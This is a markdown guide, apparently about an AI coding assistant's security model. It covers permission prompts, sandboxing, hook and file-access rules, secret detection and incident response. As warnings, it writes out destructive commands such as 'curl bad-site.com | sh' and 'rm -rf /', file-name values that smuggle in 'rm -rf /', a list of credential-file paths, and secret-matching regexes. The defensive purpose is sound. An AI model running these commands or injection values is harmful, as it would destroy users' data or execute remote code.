# Security Model

Claude Code's security architecture, permission system, sandboxing, and safe execution practices.

## Security Philosophy

```
1. Transparency - Always explain what will be executed
2. User Control - User has final say on risky operations
3. Least Privilege - Request only necessary permissions
4. Defense in Depth - Multiple layers of protection
5. Fail Secure - When in doubt, ask permission
```

## Permission System

### How Permissions Work

**Automatic Permission:**
```
Low-risk operations proceed automatically:
- Reading files in project directory
- Running tests
- Searching code
- Viewing git status
- Installing dependencies via uv

No prompt shown to user.
```

**Permission Prompts:**
```
High-risk operations require user approval:
- Executing shell commands that modify system
- Network operations (API calls, web requests)
- File operations outside project directory
- Destructive git operations
- Publishing/deploying code
- Modifying cloud resources

User sees prompt with:
- What will be executed
- Why it's needed
- Potential impact
```

**Example Permission Flow:**

```
Action: Need to run database migration

Internal decision:
  Risk Level: MEDIUM-HIGH
  - Modifies database schema
  - Could break existing data
  - Requires database access
  Decision: REQUEST permission

Prompt shown to user:
  "I need to run the database migration:

   Command: uv run alembic upgrade head

   This will:
   - Apply schema changes to the database
   - Create new tables for user authentication
   - Modify existing 'users' table to add email field

   Risk: Schema changes are permanent. Backup recommended.

   Proceed? [Yes/No]"

User approves → Execute
User denies → Skip and report
```

### Permission Granularity

**File System:**
```
Auto-approved:
  - Read any file in project
  - Write files in project (after Read)
  - Create directories in project
  - Delete files in project (with warning)

Requires permission:
  - Read files outside project (/etc, ~/, /var)
  - Write files outside project
  - Modify system files
  - Delete many files at once
```

**Network:**
```
Auto-approved:
  - Installing packages from PyPI/npm
  - Cloning public repos
  - GitHub API (via gh CLI)

Requires permission:
  - Making HTTP requests to APIs
  - Uploading data to services
  - Deploying applications
  - Modifying cloud resources
```

**Git:**
```
Auto-approved:
  - git status, log, diff, show
  - git add, commit (with hook verification)
  - git push to feature branches
  - Creating branches

Requires permission:
  - git push --force to main/master
  - git reset --hard
  - git clean -fd
  - Deleting branches
  - Modifying remote repositories
```

### Permission Persistence

**Within Session:**
```
Permissions apply once per request:
- User approves running "deploy.sh"
- Script runs once
- Next time, must ask again

No blanket "always allow" within session.
Exception: Basic operations (read, test) always allowed.
```

**Across Sessions:**
```
No persistence:
- New conversation = fresh permissions
- Previous approvals don't carry over
- User must reapprove risky operations

This prevents accidental automation of dangerous ops.
```

## Sandboxing

### What is Sandboxing?

**Concept:**
```
Sandbox = Isolated environment where Claude Code runs

When enabled:
- Limited file system access
- Controlled network access
- Restricted system commands
- Can't affect host system

When disabled:
- Full access to file system
- Full network access
- Can run any command
- Can affect host system
```

**Current State:**
```
Claude Code primarily runs WITHOUT sandboxing.

Configuration example:
  dangerouslyDisableSandbox: false

This means:
- Sandbox is available
- Can be disabled for specific operations
- User controls sandboxing per command
```

### Sandboxed Operations

**File System:**
```
With sandbox:
  ✅ Read project files
  ✅ Write project files
  ❌ Read /etc/passwd
  ❌ Write to /usr/local
  ❌ Delete system files

Without sandbox:
  ✅ Full file system access
  ⚠️  Can modify system files
  ⚠️  Can delete important data
```

**Network:**
```
With sandbox:
  ✅ Install packages (PyPI, npm)
  ✅ Access approved APIs
  ❌ Arbitrary network connections
  ❌ Port scanning
  ❌ Server operations

Without sandbox:
  ✅ Full network access
  ⚠️  Can make any network request
  ⚠️  Can run servers
```

**Process Execution:**
```
With sandbox:
  ✅ Run project commands
  ✅ Run tests, linters
  ❌ System administration commands
  ❌ Background daemons
  ❌ sudo operations

Without sandbox:
  ✅ Run any command
  ⚠️  Can run system commands
  ⚠️  Can start daemons
```

### Disabling Sandbox

**When to Disable:**
```
Disable sandbox for:
- System administration tasks
- Operations requiring full access
- Commands that need host network
- Docker operations
- Homebrew installs

User explicitly requests or task requires it.
```

**How to Disable:**
```bash
# In Bash tool call:
Bash(
  command="brew install something",
  dangerouslyDisableSandbox=true,
  description="Install package via homebrew"
)

⚠️ Use sparingly and only when necessary
```

**Safety When Disabled:**
```
Even without sandbox:
1. Still request permission for risky ops
2. Still explain what will be executed
3. Still verify commands before running
4. User maintains control via approval
```

## Hook Security

### Pre-Commit Hook Risks

**Command Injection Risk:**
```yaml
# VULNERABLE pre-commit config:
- repo: local
  hooks:
    - id: custom
      entry: sh -c "git diff --name-only | xargs mycommand"

Risk: If filenames contain shell metacharacters
  File: test'; rm -rf /;'.py
  Executes: rm -rf /

Claude Code response:
  ❌ NEVER write hooks that execute arbitrary input
  ✅ Use proper escaping and validation
```

**Safe Hook Patterns:**
```yaml
# SAFE pre-commit config:
- repo: https://github.com/psf/black
  rev: 23.1.0
  hooks:
    - id: black
      # Official hook, vetted code

- repo: local
  hooks:
    - id: custom
      entry: python scripts/validate.py
      # Dedicated script with input validation
```

### Hook Execution

**What Hooks Can Do:**
```
Pre-commit hooks have full access:
- Read all staged files
- Modify files
- Run any command
- Access network
- Access file system

Risk level: HIGH
- Hooks from trusted sources: OK
- Hooks from unknown sources: DANGEROUS
```

**Claude Code Hook Policy:**

```
1. NEVER bypass hooks (--no-verify forbidden)
2. NEVER write hooks that execute untrusted input
3. ALWAYS use official hooks when available
4. ALWAYS validate input in custom hooks
5. EXPLAIN hook failures, don't hide them
```

**Example Safe Custom Hook:**

```python
#!/usr/bin/env python3
# scripts/validate_imports.py
# Run as pre-commit hook

import sys
from pathlib import Path

def validate_file(filepath: Path) -> bool:
    """Validate imports in a Python file."""
    # Input validation
    if not filepath.exists():
        return True
    if filepath.suffix != '.py':
        return True

    # Safe file reading
    try:
        content = filepath.read_text()
    except Exception as e:
        print(f"Error reading {filepath}: {e}")
        return False

    # Validation logic
    forbidden = ['from os import *', 'from sys import *']
    for pattern in forbidden:
        if pattern in content:
            print(f"Forbidden import in {filepath}: {pattern}")
            return False

    return True

def main():
    files = sys.argv[1:]  # Files from pre-commit

    # Validate each file safely
    all_valid = all(validate_file(Path(f)) for f in files)

    sys.exit(0 if all_valid else 1)

if __name__ == '__main__':
    main()
```

**Hook Configuration:**
```yaml
# .pre-commit-config.yaml
- repo: local
  hooks:
    - id: validate-imports
      name: Validate imports
      entry: python scripts/validate_imports.py
      language: system
      types: [python]
      # Safe: Dedicated script with input validation
```

## File Access Controls

### Project Boundaries

**Inside Project:**
```
Full access (with Read-before-Write):
  ✅ /Users/harper/project/src/
  ✅ /Users/harper/project/tests/
  ✅ /Users/harper/project/docs/
  ✅ /Users/harper/project/.claude/

Auto-approved operations.
```

**Outside Project:**
```
Restricted access (requires explanation):
  ⚠️  /Users/harper/other-project/
  ⚠️  /Users/harper/.ssh/
  ⚠️  /etc/
  ⚠️  /usr/local/

Must explain why access needed.
User must approve.
```

**System Files:**
```
High scrutiny (requires strong justification):
  ❌ /etc/passwd
  ❌ /etc/hosts
  ❌ ~/.ssh/id_rsa
  ❌ ~/.aws/credentials

Require explicit user approval.
Explain risks clearly.
```

### File Operation Safety

**Reading Files:**
```
Safe:
  Read("project/config.py")
  Read(".env.example")  # Example files

Requires justification:
  Read("/etc/hosts")           # System file
  Read("~/.ssh/config")        # User SSH config
  Read("../.env")              # Outside project

Dangerous:
  Read("~/.ssh/id_rsa")        # Private key
  Read("~/.aws/credentials")   # Cloud credentials
  Read("/etc/shadow")          # System passwords
```

**Writing Files:**
```
Safe:
  Write("project/new_file.py", content)
  Write("docs/README.md", content)

Requires justification:
  Write("../other-project/file.py", content)
  Write("~/.bashrc", content)

Dangerous:
  Write("/etc/hosts", content)
  Write("~/.ssh/authorized_keys", content)
  Write("/Library/LaunchDaemons/...", content)
```

**Deleting Files:**
```
Warning shown:
  Delete single file: "About to delete X, confirm?"
  Delete multiple: "About to delete 10 files, confirm?"
  Delete directory: "About to delete dir/ and contents, confirm?"

Never auto-delete:
  - Important project files (package.json, pyproject.toml)
  - Git repository (.git/)
  - User data
```

## Command Execution Safety

### Command Validation

**Before Execution:**
```
Claude Code checks:
1. Is command safe? (read-only vs modifying)
2. Does it need permission?
3. Are there dangerous flags? (--force, -rf)
4. Is user input properly quoted?
5. Could it cause data loss?
```

**Example Validations:**

```bash
# SAFE - read only
git status
git log --oneline -10
pytest --collect-only

# SAFE - project operations
uv add requests
git commit -m "message"
pytest

# REQUIRES PERMISSION - modifying
git push --force origin main
rm -rf dist/
sudo systemctl restart service

# DANGEROUS - needs strong justification
rm -rf /
curl bad-site.com | sh
sudo chmod 777 -R /
```

### Input Sanitization

**Quoting User Input:**
```bash
# User provides: filename = "my document.txt"

# UNSAFE:
cd my document.txt
# Breaks on space

# SAFE:
cd "my document.txt"
# Properly quoted

Claude Code always quotes:
- Paths with spaces
- User-provided strings
- Variable expansions
```

**Preventing Injection:**
```bash
# User input: file = "test.txt; rm -rf /"

# UNSAFE:
bash -c "cat $file"
# Executes: cat test.txt; rm -rf /

# SAFE:
cat "$file"
# Treats as literal filename (fails safely)

# SAFER:
# Validate input before using
if not is_valid_filename(file):
    error("Invalid filename")
```

**Array Arguments:**
```bash
# User provides: files = ["a.txt", "b.txt", "c.txt"]

# SAFE:
git add "a.txt" "b.txt" "c.txt"
# Each file properly quoted

# Also safe (sequential):
git add "a.txt"
git add "b.txt"
git add "c.txt"
```

## Secret Handling

### Secret Detection

**Common Secrets:**
```
Patterns Claude Code looks for:
- AWS keys: AKIA[0-9A-Z]{16}
- GitHub tokens: ghp_[a-zA-Z0-9]{36}
- API keys: [a-zA-Z0-9]{32,}
- Private keys: -----BEGIN PRIVATE KEY-----
- Passwords: password=...

Files to avoid committing:
- .env (actual env vars)
- credentials.json
- secrets.yaml
- *.key, *.pem
- id_rsa, id_ed25519
```

**Pre-Commit Check:**
```
Before committing:

1. Check staged files:
   git diff --staged --name-only

2. Look for secret patterns:
   .env → ❌ "Contains .env file - likely has secrets"
   credentials.json → ❌ "Credentials file detected"
   .env.example → ✅ "Example file, OK"

3. If secrets detected:
   "⚠️  About to commit files that likely contain secrets:
    - .env
    - api_keys.json

    This is dangerous - secrets should not be in version control.

    Options:
    1. Add to .gitignore
    2. Use .env.example instead
    3. Use environment variables

    Do you really want to commit these?"

4. Require explicit user approval
```

**Example Secret Detection:**

```python
# Before commit
git add .env database/credentials.json

# Claude Code checks:
files = ["env", "database/credentials.json"]

# Detection:
.env matches secret file pattern
credentials.json matches secret file pattern

# Response:
"⚠️  STOP - Attempting to commit secret files:
 - .env (environment variables)
 - database/credentials.json (database credentials)

 Secrets should NEVER be committed to git.

 Recommended actions:
 1. Add these to .gitignore:
    echo '.env' >> .gitignore
    echo 'credentials.json' >> .gitignore

 2. Use example files instead:
    cp .env .env.example  # Remove actual values
    git add .env.example

 3. Use environment variables or secret management

 I will NOT commit these files without explicit approval.
 Do you want to proceed anyway? (Not recommended)"
```

### Secret Management

**Recommended Patterns:**

```bash
# ✅ Use .env files (gitignored)
.env                    # Actual secrets (in .gitignore)
.env.example           # Template (committed)

# ✅ Use environment variables
export API_KEY="secret"
uv run python app.py

# ✅ Use secret management services
AWS Secrets Manager
HashiCorp Vault
GitHub Secrets

# ❌ Don't hardcode
API_KEY = "sk-1234567890"  # NO!

# ❌ Don't commit
git add .env  # NO!
```

**Helping Users Avoid Secrets:**

```
When user tries to commit secrets:

1. Explain risk:
   "Secrets in git are permanent - even if you delete them
    later, they remain in history and can be extracted."

2. Suggest alternatives:
   "Use environment variables:
    export DATABASE_URL='...'

    Or use .env file (gitignored):
    echo 'DATABASE_URL=...' > .env
    echo '.env' >> .gitignore"

3. Offer to fix:
   "I can:
    1. Create .env.example template
    2. Add .env to .gitignore
    3. Remove secrets from staged files

    Should I do this?"
```

## Network Access

### Outbound Requests

**Package Installation:**
```
Auto-approved:
  ✅ uv add requests
  ✅ npm install express
  ✅ pip install pandas

From trusted sources:
  - PyPI (Python Package Index)
  - npm registry
  - Official package repositories
```

**API Requests:**
```
Requires explanation:
  ⚠️  Making HTTP request to api.example.com
  Why: Need to test API integration
  User approval: Required

  ⚠️  Uploading data to service.com
  Why: Deploying application
  User approval: Required
```

**Git Operations:**
```
Auto-approved:
  ✅ git clone https://github.com/user/repo
  ✅ git pull origin main
  ✅ git fetch

Requires permission:
  ⚠️  git push --force origin main
  Why: Overwriting remote history
  User approval: Required
```

### Inbound Requests

**Running Servers:**
```
Requires explanation:
  ⚠️  Starting server on port 8000
  Why: Testing web application
  User approval: Required

Security consideration:
  "Server will be accessible on localhost:8000
   If on shared network, could be accessed by others.
   Use 127.0.0.1:8000 for localhost-only."
```

**Exposing Services:**
```
Requires strong justification:
  ❌ Starting server on 0.0.0.0:8000
  Why: Accessible from any network interface
  Risk: HIGH - exposes service to network
  User approval: Required + warning
```

## MCP Server Permissions

### What are MCP Servers?

**Model Context Protocol Servers:**
```
MCP servers extend Claude Code capabilities:
- Web browsing (playwright, chrome)
- Private journal
- Social media
- Chronicle (time tracking)
- Custom integrations

Each server has own permissions.
```

### MCP Permission Model

**Server-Specific Permissions:**
```
playwright server:
  Can: Control web browser
  Can: Navigate to URLs
  Can: Take screenshots
  Can: Execute JavaScript
  Risk: HIGH - full browser control

private-journal server:
  Can: Read/write journal files
  Can: Search journal entries
  Risk: LOW - only affects journal

chronicle server:
  Can: Log timestamps
  Can: Search history
  Risk: LOW - time tracking only
```

**Permission Requests:**
```
When using MCP tools:

User: "Browse to example.com and take screenshot"

Permission flow:
1. MCP tool: playwright__browser_navigate
2. Permission: Request user approval
3. Show: "Navigating to example.com via browser"
4. User approves
5. Execute navigation
6. Take screenshot (separate permission if needed)
```

### MCP Security Considerations

**Browser Automation:**
```
playwright/chrome servers can:
  ✅ Visit any URL
  ✅ Execute JavaScript on pages
  ✅ Access cookies/storage
  ✅ Submit forms
  ⚠️  Interact with authenticated sessions

Risks:
  - Could access private data
  - Could trigger actions in web apps
  - Could expose credentials

Mitigation:
  - User approval for sensitive operations
  - Clear explanation of what will be done
  - Don't access banking/sensitive sites without explicit approval
```

**Journal/Chronicle:**
```
private-journal/chronicle can:
  ✅ Read local files (journal entries)
  ✅ Write local files
  ✅ Search entries

Risks:
  - Could expose private thoughts/data
  - Low risk (local files only)

Mitigation:
  - Files stored locally
  - User owns data
  - No network access
```

## Best Practices

### For Users

**Enable Security Features:**
```
1. Use pre-commit hooks:
   - Formatters
   - Linters
   - Secret scanners

2. Review Claude Code actions:
   - Check git diffs before commit
   - Review permission prompts
   - Verify commands before approval

3. Protect secrets:
   - Use .gitignore for .env
   - Never commit credentials
   - Use secret management tools

4. Monitor behavior:
   - Check what files are read/written
   - Verify network requests
   - Review git history
```

### For Claude Code

**Security-First Mindset:**
```
1. Always prefer safe operations:
   - Read before write
   - Test before deploy
   - Commit before destructive changes

2. Request permission for:
   - System-wide changes
   - Network operations
   - Destructive actions
   - Secret handling

3. Validate inputs:
   - Quote file paths
   - Sanitize user input
   - Check file existence
   - Validate permissions

4. Explain risks:
   - What will happen
   - What could go wrong
   - How to recover
   - Alternatives available

5. Fail securely:
   - Ask when unsure
   - Don't bypass safety checks
   - Preserve user data
   - Log security events
```

## Incident Response

### If Something Goes Wrong

**Data Loss:**
```
1. Stop immediately
2. Don't make it worse
3. Check git history:
   git reflog  # Recent HEAD positions
   git log --all  # All commits
4. Attempt recovery:
   git reset --hard <commit>
5. Inform user:
   "I accidentally deleted X. I found it in git history
    at commit abc123. I can restore it."
```

**Committed Secrets:**
```
1. Don't panic (but act quickly)
2. Rotate the secret immediately:
   "You committed an API key. You need to:
    1. Revoke it: [service dashboard]
    2. Generate new key
    3. Update .env file

    Git history removal (after rotation):
    git filter-branch --force --index-filter \
      'git rm --cached --ignore-unmatch .env' \
      --prune-empty --tag-name-filter cat -- --all

    But history may be on GitHub - contact support."
```

**Unauthorized Access:**
```
1. Identify what was accessed
2. Assess damage
3. Inform user immediately:
   "I accidentally accessed /etc/passwd (or other file).
    This shouldn't have happened. Here's what was seen:
    [minimal description]

    No data was sent externally.
    Recommend reviewing security logs."
```

## Summary

### Security Layers

```
Layer 1: User Approval
  - Permission prompts for risky operations
  - User maintains control

Layer 2: Sandboxing (when enabled)
  - Restricted file system access
  - Controlled network access
  - Limited command execution

Layer 3: Input Validation
  - Proper quoting
  - Injection prevention
  - Path validation

Layer 4: Pre-Commit Hooks
  - Code quality checks
  - Secret scanning
  - Test verification

Layer 5: Best Practices
  - Read before write
  - Explain before execute
  - Commit before destroy
  - Ask when unsure
```

### Key Principles

1. **Transparency** - Always explain what will happen
2. **User Control** - User has final say
3. **Least Privilege** - Request minimum necessary access
4. **Defense in Depth** - Multiple protective layers
5. **Fail Secure** - When in doubt, ask permission

These security practices ensure Claude Code operates safely while maintaining productivity and user trust.
